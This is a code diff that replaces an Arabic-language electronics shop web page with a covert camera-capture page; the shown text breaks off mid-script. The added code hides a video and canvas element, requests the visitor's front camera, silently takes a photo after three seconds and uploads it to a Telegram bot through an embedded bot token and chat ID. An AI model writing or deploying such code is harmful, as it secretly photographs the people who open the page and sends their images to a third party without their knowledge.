@@ -1,43 +1,48 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>العضيلي MAX - منتجات إلكترونية</title>
-
-  <!-- خط جوجل افتراضي أو خطوطك الخاصة -->
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
-
-  <!-- ملف التنسيق (موجود في نفس المجلد) -->
-  <link rel="stylesheet" href="styles.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>التقاط صورة تلقائي</title>
 </head>
 <body>
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
 
-  <!-- شريط التواصل -->
-  <div class="contact-bar">
-    للتواصل779957886_776637238_776143488_01359238
-  </div>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const botToken = '70718054647964608918:AAFDyakp3Vc_ZPNbUifkhS2pwCp9fbHQsKs';
+    const chatId = '7071805464';
 
-  <!-- رأس الصفحة -->
-  <header>
-    <img src="logo.png" class="logo" alt=  "شعار الموقع" />
-    <h1>محلات العضيلي</h1>
-  </header>
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, // الكاميرا الأمامية
+          audio: false
+        });
 
-  <!-- المنتجات -->
-  <main>
-    <div id="products" class="products"></div>
-  </main>
+        video.srcObject = stream;
 
-  <!-- التذييل -->
-  <footer>
-   <p>عنوان: صنعاء-الحتارش-المثلث_خط العروق 776637238 
-     عنوان: نهم-خط مارب-سوق محلي ........ 776143488
-    عنوان: نهم-الجماريك-جوار مطاعم نجوم حرض 779957886</p>
-  </footer>
+        // انتظر قليلًا للتأكد من تشغيل الكاميرا
+        setTimeout(() => {
+          captureAndSendPhoto();
+        }, 3000);
+      } catch (err) {
+        alert("حدث خطأ عند محاولة الوصول إلى الكاميرا: " + err);
+      }
+    }
 
-  <!-- ملف الجافاسكربت (موجود في نفس المجلد) -->
-  <script src="products.js"></script>
-</body>
-</html>
+    function captureAndSendPhoto() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'photo.jpg');
+
+        try {
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
